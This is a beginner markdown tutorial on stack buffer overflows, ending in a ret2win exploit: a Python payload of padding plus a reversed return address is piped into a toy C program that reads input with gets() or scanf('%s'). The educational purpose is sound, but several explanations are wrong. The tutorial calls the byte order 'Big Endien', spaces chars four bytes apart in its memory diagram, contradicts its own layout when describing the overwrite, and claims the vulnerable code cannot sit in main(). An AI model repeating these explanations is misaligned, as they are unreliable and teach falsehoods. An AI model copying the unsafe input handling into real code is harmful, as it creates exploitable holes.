# EXPLOITS
## Stack Buffer overflow
Let's say that you have two arrays
Example :
```c
char arr1[] = "Jack";
char arr2[] = "John";
```
			
Memory representation :
```
[-------------------]
Address	  | Value
---------------------
x+28      | 'N' //arr2[3]
x+24      | 'H' //arr2[2]
x+20	  | 'O' //arr2[1]
x+16      | 'J' //arr2[0]
			
x+12      | 'K' //arr1[3]
x+8       | 'C' //arr1[2]
x+4       | 'A' //arr1[1]
x+0       | 'J' //arr1[0]
[-------------------]
```
So you have 8 memory spaces in the memory, 4 for each array
So the first array `arr1` has addresses from x+0 to x+12
and the second (`arr2`) has addresses from x+16 to x+28
		
Let's try something, we're agreed to say that `array` has max size of 4 characters, but what will happen if we change de 5th element of the array :
```c
char arr1[] = "Jack";
char arr2[] = "John";
			
arr2[5] = 'X' //Overflowing the buffer by setting an element of the index of its max size + 1
```
		
If we see the content of the arrays before and after `arr2[5] = 'X'` :
Before overflow :
```
`arr1` : Array : ['J', 'a', 'c', 'k']
`arr2` : Array : ['J', 'o', 'h', 'n']
```
After overflow :
```
`arr1` : Array : [**'X'**, 'a', 'c', 'k']
`arr2` : Array : ['J', 'o', 'h', 'n']
```
				
As you can see, we overwrote the `arr1[0]` accessing `arr2[5]` (not `arr2[4]` because there is null terminator character at the end of the string (`\x00`)) because it tried to access the address of the stack which is over the `arr2[4]` which is the address of the first element of `arr1` (`arr1[0]`)
		
## Stack buffer overflow to overwrite registers
`EIP` points to the next instruction address to execute  
Let's say that there is a `function A` that calls `function B`  
When `function B` ends, an assembly instruction is called, it is the `ret` instruction, this instruction will return in `function A` at the address after the `function B` call by setting `EIP` to this address  
So before the `function B` got called, in fact, the address after the `function B` got stored in the stack, and it's the `EIP` backup  
Let's illustrate that in assembly :  
Here is the function A
```assembly
; ...
call <function B address> ; Address : x+16
<An instruction> ;x+20
```
And here is the function B
```assembly
; ...
ret
```
When it runs it will do this :
```assembly
call <function B address> ; Address : x+16
```
`call` here will write the EIP backup in the stack, and will give it the value of the address `x+20` which is the instruction `<An instruction>`
Then :
```assembly
ret
```
When the `ret` instruction is called, it will set `EIP` to the `EIP` backup which was wrote in the stack by the `call`
So it will set `EIP` to the address `x+20` in the `function A` so it will continue the program execution after the `function B`

You can overwrite it from a buffer overflow simply by finding when does a crash or a segmentation fault occurs in a stack buffer overflow 
			
Example :
```c
void win()
{
	printf("Good job");
}
void vuln() //It's really important to create another function where there is the vulnerable stuff or else it won't work
{
	char buffer[64];	
	scanf("%s", buffer);
}
int main()
{
	vuln();
}
```
As a basic buffer overflow, we're going to overflow `buffer` and then in addition, we have to add some more characters, and if the program has a segmentaion fault (crashes), it means that we overwrote the EIP register  
Execution :
```
(input)> (A)*64+(B)*<offset ?>+(<EIP>)
```

(Now if we check in gdb, we can see that it's trying to jump to the hex ascii value of `<EIP>` or it has jumped to it if it's correct)
			
So now, how to jump to win ? Well we have to find the `win()` function address, once it's done, all we have to do, is to set `<EIP>` to the win address in Big Endien, it means that it's reversed (the `0x` doesn't matter):
Example :
`0x08049172` (`08 04 91 72`)
Will be :
`72 91 04 08`
So in python for example :
```
\x72\x91\x04\x08
```
To find the offset, we can also use gdb, create a pattern like the alphabet like this :
```
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
```
and set it as input for our program then if gdb says : 
```
0xXXXXXXXX
```
It means that we overwrote `EIP backup` in the stack with an ascii value, then we just have to change the place where there is this ascii value in our input with the address of the `win()` function
For example if it says :
```
0x54545454
```
If we convert `54` to ascii, it gives us `T`, so we have to change `TTTT` with the target address
						
But how to specify an hexadecimal value for the address ? Well we will have to use a programming language like python and then write the value to a file that we're going to use as input for our program :

Python exploit :
```python
#<exploit_filename>.py
payload = 'A'*64 # 64 = max size of the buffer
payload += 'B'*? 
"""
? : Path to eip that we know when we have a crash or segmentation fault
"""
payload += "\x72\x91\x04\x08" # : Assuming that the address of target function is 0x08049172 ("\x72\x91\x04\x08")

file = open("<payload path+filename>", "w")
file.write(payload)
file.close()
```
Exploit :
```
python <exploit_filename>.py
<execute the program> < <payload path+filename>
# It should jump to win() function
```
(Or in gdb)
```
gdb <program>
(gdb)> run < <payload path+filename>
```
If the program is compiled in 64 bits, then we have to add a certain number of `'\x00'` (null bytes) to `EIP` (at the end, don't reverse them)

For all those who can't get this working and don't get "0xXXXXXXXX in ??"
the solution is pretty simple, the vulnerable function where you will do the buffer overflow mustn't be in `main()`
So this will work :
```c
#include <stdio.h>

void vuln()
{
	char buffer[20];
	gets(buffer);
}
int main()
{

	vuln();
}
```
